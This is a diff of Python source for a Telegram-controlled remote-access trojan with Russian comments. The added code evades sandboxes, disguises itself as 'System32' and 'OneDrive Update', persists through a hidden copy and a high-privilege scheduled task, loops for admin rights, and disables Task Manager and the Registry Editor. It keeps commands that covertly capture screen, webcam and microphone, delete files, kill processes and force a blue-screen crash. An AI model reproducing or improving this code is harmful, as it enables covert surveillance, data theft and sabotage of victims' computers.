@@ -41,19 +41,27 @@ TelegramChatID = 'ID'
 #Прокси (True / False)
 Proxy = False
 Ip = 'Ip'
-Port = 'Proxy'
+Port = 'Port'
 
 
-#Отключать Диспетчер Задач при первом запуске (True / False)
-DisableTaskManager = False
-#Всегда запускать от имени администратора (True / False)
+#Запускать от имени администратора
 AdminRightsRequired = False
 
 
-#Добавлять в автозагрузку при первом запуске (True / False)
+#Отключать Диспетчер Задач при первом запуске
+DisableTaskManager = False
+#Отключать Редактор Реестра при первом запуске
+DisableRegistryTools = False
+
+
+#Добавлять в автозагрузку при первом запуске
 AutorunEnabled = False
-#Название файла при копировании в автозагрузку
-AutorunName = 'System32'
+#Директория для копирования файлов
+InstallPath = 'C:\\ProgramData'
+#Имя файла в автозагрузке
+AutorunName = 'OneDrive Update'
+#Имя процесса в диспетчере задач
+ProcessName = 'System32'
 
 
 #Выводить сообщение при запуске (True / False)
@@ -127,7 +135,7 @@ main6.row(button2)
 main7 = types.ReplyKeyboardMarkup()
 button1 = types.KeyboardButton('/CD\n🗂')
 button2 = types.KeyboardButton('/Upload\n📡')
-button3 = types.KeyboardButton('/Ls\n📄')
+button3 = types.KeyboardButton('/ls\n📄')
 button4 = types.KeyboardButton('/Remove\n🗑')
 button5 = types.KeyboardButton('/Download\n📨')
 button6 = types.KeyboardButton('/Run\n📌')
@@ -141,7 +149,7 @@ button1 = types.KeyboardButton('/5\n<<')
 button2 = types.KeyboardButton('/Screen\n🖼')
 button3 = types.KeyboardButton('/6\n>>')
 button4 = types.KeyboardButton('/Message\n💬')
-button5 = types.KeyboardButton('/Voice\n📢')
+button5 = types.KeyboardButton('/Say\n📢')
 button6 = types.KeyboardButton('/OpenURL\n🌐')
 button7 = types.KeyboardButton('/Wallpapers\n🧩')
 button8 = types.KeyboardButton('/ForkBomb\n⏱')
@@ -154,7 +162,8 @@ for file in glob.glob('C:\\Users\\John\\Desktop\\foobar.*'):
    sys.exit()
 for file in glob.glob('C:\\Users\\Peter Wilson\\Desktop\\Microsoft Word 2010.lnk'):
    sys.exit()
-
+for file in glob.glob('C:\\Users\\Lisa\\Desktop'):
+   sys.exit()
 
 if os.path.exists('C:\\Program Files\\Windows Defender'):
    av = 'Windows Defender'
@@ -176,10 +185,10 @@ if os.path.exists('C:\\Program Files (x86)\\Kaspersky Lab'):
    av = 'Kaspersky'
 if os.path.exists('C:\\Program Files (x86)\\360\\Total Security'):
    av = '360 Total Security'
-else:
-   pass
 
 
+Expansion = os.path.splitext(os.path.basename(sys.argv[0]))[1]
+CurrentName = os.path.basename(sys.argv[0])
 
 
 if Proxy is True:
@@ -199,59 +208,139 @@ if AdminRightsRequired is True:
    else:
     break
 
+if AdminRightsRequired is True:
+ try:
+  admin = os.getuid() == 0
+ except AttributeError:
+  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+ if admin is False:
+  sys.exit()
+
 if DisableTaskManager is True:
  try:
-  if os.path.exists(os.environ['ProgramData'] + '\\regedit.bat'):
+  if os.path.exists(os.environ['ProgramData']+'\\DisableTaskManager'):
    pass
   else:
-   directory = os.environ['ProgramData']
-   with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
-   	OPATH.writelines([
-   	    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
-   	    'Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n',
-   	    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
-   	    'Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
-   while True:
+   try:
+    admin = os.getuid() == 0
+   except AttributeError:
+    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+   if admin is True:
     try:
-     os.startfile(os.environ['ProgramData'] + '\\regedit.bat', 'runas')
+     subprocess.Popen(
+             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
+             'Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
+     open(os.environ['ProgramData']+'\\DisableTaskManager', 'a').close()
     except:
      pass
-    else:
-     break
- except:
-    pass
-
-if AutorunEnabled is True:
- try:
-  fname = AutorunName + os.path.splitext(os.path.basename(sys.argv[0]))[1]
-  path = os.environ['AppData'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
-  file = os.path.basename(sys.argv[0])
-  if os.path.exists(path + fname):
-   pass
-  else:
-   shutil.copy2((sys.argv[0]), r'' + path)
-   os.rename(path + os.path.basename(sys.argv[0]), path + fname)
-   os.utime(path + fname,(1330712280, 1330712292))
-   try:
-    if AdminRightsRequired is True:
-     os.startfile(path + fname, 'runas')
-    else:
-     os.startfile(path + fname)
-   except:
-    pass
+   if admin is False:
+    while True:
+     try:
+      os.startfile(sys.argv[0], 'runas')
+     except:
+      pass
+     else:
+      break
  except:
   pass
 
+if DisableTaskManager is True:
+ try:
+  admin = os.getuid() == 0
+ except AttributeError:
+  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+ if admin is False:
+  if os.path.exists(os.environ['ProgramData']+'\\DisableTaskManager'):
+   pass
+  else:
+   sys.exit()
+
+if DisableRegistryTools is True:
+ try:
+  if os.path.exists(os.environ['ProgramData']+'\\DisableRegistryTools'):
+   pass
+  else:
+   try:
+    admin = os.getuid() == 0
+   except AttributeError:
+    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+   if admin is True:
+    try:
+     subprocess.Popen(
+             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
+             'Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f')
+     open(os.environ['ProgramData']+'\\DisableRegistryTools', 'a').close()
+    except:
+     pass
+   if admin is False:
+    while True:
+     try:
+      os.startfile(sys.argv[0], 'runas')
+     except:
+      pass
+     else:
+      break
+ except:
+  pass
+
+if DisableRegistryTools is True:
+ try:
+  admin = os.getuid() == 0
+ except AttributeError:
+  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+ if admin is False:
+  if os.path.exists(os.environ['ProgramData']+'\\DisableRegistryTools'):
+   pass
+  else:
+   sys.exit()
+
+if AutorunEnabled is True:
+ try:
+  if os.path.exists(InstallPath+'\\'+ProcessName+Expansion):
+   pass
+  else:
+   try:
+    admin = os.getuid() == 0
+   except AttributeError:
+    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+   if admin is True:
+    try:
+     shutil.copy2(sys.argv[0], r''+InstallPath+'\\'+ProcessName+Expansion)
+     ctypes.windll.kernel32.SetFileAttributesW(InstallPath+'\\'+ProcessName+Expansion, 2)
+     subprocess.Popen('schtasks /create /f /sc onlogon /rl highest /tn "'+AutorunName+'" /tr "'+InstallPath+'\\'+ProcessName+Expansion+'"')
+    except:
+     pass
+   if admin is False:
+    while True:
+     try:
+      os.startfile(sys.argv[0], 'runas')
+     except:
+      pass
+     else:
+      break
+ except:
+  pass
+
+if AutorunEnabled is True:
+ try:
+  admin = os.getuid() == 0
+ except AttributeError:
+  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+ if admin is False:
+  if os.path.exists(InstallPath+'\\'+ProcessName+Expansion):
+   pass
+  else:
+   sys.exit()
+
 if DisplayMessageBox is True:
  try:
-  if os.path.exists(os.environ['ProgramData'] + '\\MessageBox'):
+  if os.path.exists(os.environ['TEMP'] + '\\MessageBox'):
   	pass
   else:
-  	open(os.environ['ProgramData'] + '\\MessageBox', 'a').close()
+  	open(os.environ['TEMP']+'\\MessageBox', 'a').close()
   	ctypes.windll.user32.MessageBoxW(0, Message, u''+MessageHeader, 0x30)
  except:
  	pass
-
 
 
 while True:
@@ -268,21 +357,21 @@ while True:
   r = requests.get('http://ip.42.pl/raw')
   IP = r.text
   bot.send_message(TelegramChatID, 
-  '\n' + Online +
-  '\n' + '\nPC » ' + os.getlogin() + 
-  '\nOS » ' + platform.system() + ' ' + platform.release() + 
+  '\n'+Online+
+  '\n'+'\nPC » '+os.getlogin()+
+  '\nOS » '+platform.system()+' '+platform.release()+
   '\n'
-  '\nAV » ' + av +
+  '\nAV » '+av+
   '\n'
-  '\nIP » ' + IP,
+  '\nIP » '+IP,
   reply_markup=menu)
 
-  if os.path.exists(os.environ['ProgramData'] + '\\Files'):
+  if os.path.exists(os.environ['ProgramData']+'\\Files'):
     pass
   else:
-    os.makedirs(os.environ['ProgramData'] + '\\Files')
-    os.makedirs(os.environ['ProgramData'] + '\\Files\\Documents')
-    os.makedirs(os.environ['ProgramData'] + '\\Files\\Photos')
+    os.makedirs(os.environ['ProgramData']+'\\Files')
+    os.makedirs(os.environ['ProgramData']+'\\Files\\Documents')
+    os.makedirs(os.environ['ProgramData']+'\\Files\\Photos')
  except:
    print('[-] › Нет подключения')
  else:
@@ -303,12 +392,10 @@ def main(command):
 
 @bot.message_handler(commands=['Power', 'power'])
 def power(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main2, parse_mode="Markdown")
 
 @bot.message_handler(commands=['AutoRun', 'autorun'])
 def autorun(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main3, parse_mode="Markdown")
 
 @bot.message_handler(commands=['Files', 'files'])
@@ -319,9 +406,12 @@ def files(command):
 def cancelfiles(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")
 
-@bot.message_handler(commands=['Start', 'start', 'Help', 'help'])
+@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
+def wallpapers(command):
+ bot.send_message(command.chat.id, '*Отправьте фотографию*', parse_mode="Markdown")
+
+@bot.message_handler(commands=['Help', 'help'])
 def help(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id,
   'ᅠᅠᅠᅠ  ⚙️ *Команды* ⚙️'
   '\n'
@@ -344,7 +434,7 @@ def help(command):
   '\n/Taskkill - Остановить процесс'
   '\n'
   '\n/Message - Отправить сообщение'
-  '\n/Voice - Озвучить сообщение'
+  '\n/Say - Озвучить сообщение'
   '\n/OpenURL - Открыть ссылку'
   '\n/Wallpapers - Установить обои'
   '\n/ForkBomb - Запуск программ'
@@ -357,39 +447,35 @@ def help(command):
   '\n_Coded by Bainky_ | *@bainki* 👾', 
   reply_markup=menu, parse_mode="Markdown")
 
-
-
-
 @bot.message_handler(regexp='/Screen')
 def screen(command):
  try:
   bot.send_chat_action(command.chat.id, 'upload_photo')
   screen = ImageGrab.grab()
-  screen.save(os.environ['ProgramData'] + '\\Screenshot.jpg')
-  screen = open(os.environ['ProgramData'] + '\\Screenshot.jpg', 'rb')
+  screen.save(os.environ['TEMP']+'\\Screenshot.jpg')
+  screen = open(os.environ['TEMP']+'\\Screenshot.jpg', 'rb')
   bot.send_photo(command.chat.id, screen)
   screen.close()
-  os.remove(os.environ['ProgramData'] + '\\Screenshot.jpg')
+  os.remove(os.environ['TEMP']+'\\Screenshot.jpg')
  except:
   pass
 
 @bot.message_handler(regexp='/Webcam')
 def webcam(command):
  try:
+  bot.send_chat_action(command.chat.id, 'upload_photo') 
   cap = cv2.VideoCapture(0)
   for i in range(30):
      cap.read()
   ret, frame = cap.read()
-  cv2.imwrite(os.environ['ProgramData'] + '\\Webcam.jpg', frame)
-  bot.send_chat_action(command.chat.id, 'upload_photo') 
+  cv2.imwrite(os.environ['TEMP']+'\\Webcam.jpg', frame)
   cap.release()
-  webcam = open(os.environ['ProgramData'] + '\\Webcam.jpg', 'rb')
+  webcam = open(os.environ['TEMP']+'\\Webcam.jpg', 'rb')
   bot.send_photo(command.chat.id, webcam)
   webcam.close()
-  os.remove(os.environ['ProgramData'] + '\\Webcam.jpg')
+  os.remove(os.environ['TEMP']+'\\Webcam.jpg')
  except:
- 	bot.send_chat_action(command.chat.id, 'typing')
- 	bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='/Video')
 def video(command):
@@ -401,7 +487,7 @@ def video(command):
    capture_duration = float(msg)
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
-   out = cv2.VideoWriter(os.environ['ProgramData'] + '\\Video.mp4',fourcc, 20.0, (640,480))
+   out = cv2.VideoWriter(os.environ['TEMP']+'\\Video.mp4',fourcc, 20.0, (640,480))
    start_time = time.time()
    while( int(time.time() - start_time) < capture_duration ):
       ret, frame = cap.read()
@@ -413,15 +499,14 @@ def video(command):
    cap.release()
    out.release()
    cv2.destroyAllWindows()
-   video = open(os.environ['ProgramData'] + '\\Video.mp4', 'rb')
+   video = open(os.environ['TEMP']+'\\Video.mp4', 'rb')
    bot.send_animation(command.chat.id, video)
    video.close()
-   os.remove(os.environ['ProgramData'] + '\\Video.mp4')
+   os.remove(os.environ['TEMP']+'\\Video.mp4')
   except:
    bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")
  except:
-   bot.send_chat_action(command.chat.id, 'typing')
-   bot.send_message(command.chat.id, '*Укажите длительность записи\n\n› /Video*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Укажите длительность записи\n\n› /Video*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='/Audio')
 def audio(command):
@@ -435,7 +520,7 @@ def audio(command):
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = float(msg)
-   WAVE_OUTPUT_FILENAME = os.environ['ProgramData'] + '\\Voice.wav'
+   WAVE_OUTPUT_FILENAME = os.environ['TEMP']+'\\Voice.wav'
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                   channels=CHANNELS,
@@ -455,10 +540,10 @@ def audio(command):
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
-   voice = open(os.environ['ProgramData'] + '\\Voice.wav', 'rb')
+   voice = open(os.environ['TEMP']+'\\Voice.wav', 'rb')
    bot.send_voice(command.chat.id, voice)
    voice.close()
-   os.remove(os.environ['ProgramData'] + '\\Voice.wav')
+   os.remove(os.environ['TEMP']+'\\Voice.wav')
   except:
    bot.send_message(command.chat.id, '*Не удалось записать аудио*', parse_mode="Markdown") 
  except:
@@ -468,151 +553,153 @@ def audio(command):
 def callback_inline(call):
  if call.message:
   if call.data == 'poweroff':
-    try:
-      bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*Компьютер выключен!*', parse_mode="Markdown")
-      subprocess.Popen('shutdown -s /t 0 /f')
-    except:
-      pass
+   try:
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Компьютер выключен!*', parse_mode="Markdown")
+    subprocess.Popen('shutdown -s /t 0 /f')
+   except:
+    pass
 
   if call.data == 'reboot':
-    try:
-      bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*Компьютер перезагружен!*', parse_mode="Markdown")
-      subprocess.Popen('shutdown -r /t 0 /f')
-    except:
-      pass
+   try:
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Компьютер перезагружен!*', parse_mode="Markdown")
+    subprocess.Popen('shutdown -r /t 0 /f')
+   except:
+    pass
 
   if call.data == 'bsod':
-    try:
-      bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*BSoD активирован!*', parse_mode="Markdown")
-      tmp1 = c_bool()
-      tmp2 = DWORD()
-      ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
-      ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
-    except:
-      pass
+   try:
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*BSoD активирован!*', parse_mode="Markdown")
+    tmp1 = c_bool()
+    tmp2 = DWORD()
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
+    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
+   except:
+    pass
 
   if call.data == 'startup':
-    try:
-      fname = AutorunName + os.path.splitext(os.path.basename(sys.argv[0]))[1]
-      path = os.environ['AppData'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
-      file = os.path.basename(sys.argv[0])
-      if os.path.exists(path + fname):
-        bot.edit_message_text(chat_id=call.message.chat.id,
-        message_id=call.message.message_id, text='*' + fname + '* уже находится в автозагрузке!', parse_mode="Markdown")
-      else:
-        shutil.copy2((sys.argv[0]), r'' + path)
-        bot.edit_message_text(chat_id=call.message.chat.id,
-        message_id=call.message.message_id, text='*' + file + '* скопирован в автозагрузку!', parse_mode="Markdown")
-        os.rename(path + os.path.basename(sys.argv[0]), path + fname)
-        bot.edit_message_text(chat_id=call.message.chat.id,
-        message_id=call.message.message_id, text='*' + file + '* переименован в *' + fname + '*', parse_mode="Markdown")
-        os.utime(path + fname,(1330712280, 1330712292))
-        os.startfile(path + fname)
-        bot.edit_message_text(chat_id=call.message.chat.id,
-        message_id=call.message.message_id, text='*' + fname + '* запущен из автозагрузки!', parse_mode="Markdown")
-    except:
+   try:
+    if os.path.exists(InstallPath+'\\'+ProcessName+Expansion):
+     bot.edit_message_text(chat_id=call.message.chat.id,
+     message_id=call.message.message_id, text='*'+ProcessName+Expansion+'* уже находится в автозагрузке!', parse_mode="Markdown")
+    else:
+     Startup = os.environ['AppData']+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
+     if os.path.exists(Startup+'\\'+ProcessName+Expansion):
       bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")
+      message_id=call.message.message_id, text='*'+ProcessName+Expansion+'* уже находится в автозагрузке!', parse_mode="Markdown")
+     else:
+      shutil.copy2(sys.argv[0], r''+Startup)
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*'+CurrentName+'* скопирован в автозагрузку!', parse_mode="Markdown")
+      os.rename(Startup+CurrentName, Startup+ProcessName+Expansion)
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*'+CurrentName+'* переименован в *'+ProcessName+Expansion+'*', parse_mode="Markdown")
+      os.startfile(Startup+ProcessName+Expansion)
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*'+ProcessName+Expansion+'* запущен из автозагрузки!', parse_mode="Markdown")
+   except:
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")
 
   if call.data == 'uninstall':
-    bot.edit_message_text(chat_id=call.message.chat.id,
-    message_id=call.message.message_id, text='*Вы уверены?*', reply_markup=main4, parse_mode="Markdown")
+   bot.edit_message_text(chat_id=call.message.chat.id,
+   message_id=call.message.message_id, text='*Вы уверены?*', reply_markup=main4, parse_mode="Markdown")
 
   if call.data == 'confirm':
-    try:
-      bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*Завершаем текущий процесс...*', parse_mode="Markdown")
-      time.sleep(2)
-      bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*' + os.path.basename(sys.argv[0]) + '* удален!', parse_mode="Markdown")
-      directory = os.environ['ProgramData']
-      with open(os.path.join(directory, 'uninstaller.bat'), 'w') as OPATH:
-        OPATH.writelines(['taskkill /f /im "' + os.path.basename(sys.argv[0]) + '"\n', 
-                          'timeout 1\n', 
-                          'del /s /q "', sys.argv[0]])
-      os.startfile(os.environ['ProgramData'] + '\\uninstaller.bat')
-    except:
-      bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")
+   try:
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*'+CurrentName+'* удален!', parse_mode="Markdown")
+    directory = os.environ['TEMP']
+    with open(os.path.join(directory, 'Uninstaller.bat'), 'w') as OPATH:
+      OPATH.writelines(['taskkill /f /im "'+CurrentName+'"\n', 
+                        'timeout 1\n', 
+                        'del /s /q "', sys.argv[0]])
+    os.startfile(os.environ['TEMP']+'\\Uninstaller.bat')
+   except:
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")
 
   if call.data == 'taskkill all':
-    try:
-      bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*Останавливаем...*', parse_mode="Markdown")
-      directory = os.environ['ProgramData']
-      with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
-          OPATH.writelines([
-            'if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n', 
-            'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq '
-            '%username%" /fi "IMAGENAME ne "' + os.path.basename(sys.argv[0]) + '"'])
-      os.startfile(os.environ['ProgramData'] + '\\taskkill.bat')
-      bot.edit_message_text(chat_id=call.message.chat.id,
-      message_id=call.message.message_id, text='*Все процессы остановлены!*', parse_mode="Markdown")
-    except:
-      pass
+   try:
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Останавливаем...*', parse_mode="Markdown")
+    directory = os.environ['TEMP']
+    with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
+        OPATH.writelines([
+          'if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n', 
+          'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq '
+          '%username%" /fi "IMAGENAME ne "'+CurrentName+'"'])
+    os.startfile(os.environ['TEMP']+'\\taskkill.bat')
+    bot.edit_message_text(chat_id=call.message.chat.id,
+    message_id=call.message.message_id, text='*Все процессы остановлены!*', parse_mode="Markdown")
+   except:
+    pass
 
   if call.data == 'disabletaskmgr':
-    try:
-      if os.path.exists(os.environ['ProgramData'] + '\\regedit.bat'):
-        bot.edit_message_text(chat_id=call.message.chat.id,
-        message_id=call.message.message_id, text='*Диспетчер задач уже отключен!*', parse_mode="Markdown")
+   try:
+    if os.path.exists(os.environ['ProgramData']+'\\DisableTaskManager'):
+      bot.edit_message_text(chat_id=call.message.chat.id,
+      message_id=call.message.message_id, text='*Диспетчер задач уже отключен!*', parse_mode="Markdown")
+    else:
+     directory = os.environ['TEMP']
+     with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
+       OPATH.writelines([
+           'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
+           'Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n',
+           'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
+           'Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
+     while True:
+      try:
+       os.startfile(os.environ['TEMP']+'\\regedit.bat', 'runas')
+      except:
+       pass
       else:
-       directory = os.environ['ProgramData']
-       with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
-           OPATH.writelines([
-             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
-             'Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n',
-             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
-             'Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
-       while True:
-          try:
-           os.startfile(os.environ['ProgramData'] + '\\regedit.bat', 'runas')
-          except:
-           pass
-          else:
-           bot.edit_message_text(chat_id=call.message.chat.id,
-           message_id=call.message.message_id, text='*Диспетчер задач отключен!*', parse_mode="Markdown")
-           break
-    except:
-      pass
+       bot.edit_message_text(chat_id=call.message.chat.id,
+       message_id=call.message.message_id, text='*Диспетчер задач отключен!*', parse_mode="Markdown")
+       os.remove(os.environ['TEMP']+'\\regedit.bat')
+       open(os.environ['ProgramData']+'\\DisableTaskManager', 'a').close()
+       break
+   except:
+    pass
+
+  if call.data == 'cancel':
+    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='`...`', parse_mode="Markdown")
 
 @bot.message_handler(regexp='/CD')
 def cd(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/CD ', command.text, flags=re.I)[1]
+  bot.send_chat_action(command.chat.id, 'typing')
   os.chdir(msg)
-  bot.send_message(command.chat.id, '*Директория изменена*\n\n`' + os.getcwd() + '`', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Директория изменена*\n\n`'+os.getcwd()+'`', parse_mode="Markdown")
  except FileNotFoundError:
   bot.send_message(command.chat.id, '*Директория не найдена*', parse_mode="Markdown")
  except:
-  bot.send_message(command.chat.id, '*Текущая директория*\n\n`' + os.getcwd() + '`', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Текущая директория*\n\n`'+os.getcwd()+'`\n\n*Имя пользователя*\n\n`'+os.getlogin()+'`', parse_mode="Markdown")
 
 @bot.message_handler(regexp='/ls')
 def ls(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   dirs = '\n``'.join(os.listdir(path="."))
-  bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + dirs + '`', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '`'+os.getcwd() + '`\n\n'+'`' + dirs+'`', parse_mode="Markdown")
  except:
   try:
-    bot.send_chat_action(command.chat.id, 'typing')
-    dirse = '\n'.join(os.listdir(path="."))
-    splitted_text = util.split_string(dirse, 4096)
-    for dirse in splitted_text:
-      bot.send_message(command.chat.id, '`' + dirse + '`', parse_mode="Markdown")
+   bot.send_chat_action(command.chat.id, 'typing')
+   dirse = '\n'.join(os.listdir(path="."))
+   splitted_text = util.split_string(dirse, 4096)
+   for dirse in splitted_text:
+     bot.send_message(command.chat.id, '`'+dirse+'`', parse_mode="Markdown")
   except:
-    pass
+   pass
 
 @bot.message_handler(commands=['Remove', 'remove'])
 def remove(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/Remove ', command.text, flags=re.I)[1]
-  created = os.path.getctime(os.getcwd() + '\\' + msg)
+  bot.send_chat_action(command.chat.id, 'typing')
+  created = os.path.getctime(os.getcwd()+'\\'+msg)
   year,month,day,hour,minute,second=time.localtime(created)[:-3]
   def convert_bytes(num):
       for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
@@ -624,46 +711,44 @@ def remove(command):
           file_info = os.stat(file_path)
           return convert_bytes(file_info.st_size)
   bot.send_message(command.chat.id, 
-    'Файл *' + msg + '* удален!' 
+    'Файл *'+msg+'* удален!' 
     '\n' 
-    '\nСоздан » %02d/%02d/%d'%(day,month,year) +
-    '\nРазмер » ' + file_size(os.getcwd() + '\\' + msg),
+    '\nСоздан » %02d/%02d/%d'%(day,month,year)+
+    '\nРазмер » '+file_size(os.getcwd()+'\\'+msg),
     parse_mode="Markdown")
-  os.remove(os.getcwd() + '\\' + msg)
+  os.remove(os.getcwd()+'\\'+msg)
  except:
   try:
-    bot.send_chat_action(command.chat.id, 'typing')
-    created = os.path.getctime(os.getcwd() + '\\' + msg)
-    year,month,day,hour,minute,second=time.localtime(created)[:-3]
-    folder = os.getcwd() + '\\' + msg
-    folder_size = 0
-    for (path, dirs, files) in os.walk(folder):
-      for file in files:
-        filename = os.path.join(path, file)
-        folder_size += os.path.getsize(filename)
-    files = folders = 0
-    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + msg):
-        files += len(filenames)
-        folders += len(dirnames)
-    shutil.rmtree(os.getcwd() + '\\' + msg)
-    bot.send_message(command.chat.id, 
-      'Папка *' + msg + '* удалена!'
-      '\n'
-      '\nСоздана » %02d/%02d/%d'%(day,month,year) +
-      '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
-      '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
-      parse_mode="Markdown")
+   created = os.path.getctime(os.getcwd()+'\\'+msg)
+   year,month,day,hour,minute,second=time.localtime(created)[:-3]
+   folder = os.getcwd()+'\\'+msg
+   folder_size = 0
+   for (path, dirs, files) in os.walk(folder):
+     for file in files:
+       filename = os.path.join(path, file)
+       folder_size += os.path.getsize(filename)
+   files = folders = 0
+   for _, dirnames, filenames in os.walk(os.getcwd()+'\\'+msg):
+       files += len(filenames)
+       folders += len(dirnames)
+   shutil.rmtree(os.getcwd()+'\\'+msg)
+   bot.send_message(command.chat.id, 
+     'Папка *'+msg+'* удалена!'
+     '\n'
+     '\nСоздана » %02d/%02d/%d'%(day,month,year)+
+     '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0))+
+     '\nСодержало » '+"{:,} Файлов, {:,} Папок".format(files, folders),
+     parse_mode="Markdown")
   except FileNotFoundError:
-  	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
+   bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
   except PermissionError:
-  	bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
+   bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
   except:
-  	bot.send_message(command.chat.id, '*Введите название файла\n\n› /Remove • /RemoveAll*', parse_mode="Markdown")
+   bot.send_message(command.chat.id, '*Введите название файла\n\n› /Remove • /RemoveAll*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['RemoveAll', 'removeall'])
 def removeall(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
   bot.send_message(command.chat.id, '*Удаляем...*', parse_mode="Markdown")
   folder = os.getcwd()
   folder_size = 0
@@ -688,10 +773,10 @@ def removeall(command):
   b = (len(glob.glob('*')))
   c = (a - b)
   bot.send_message(command.chat.id,
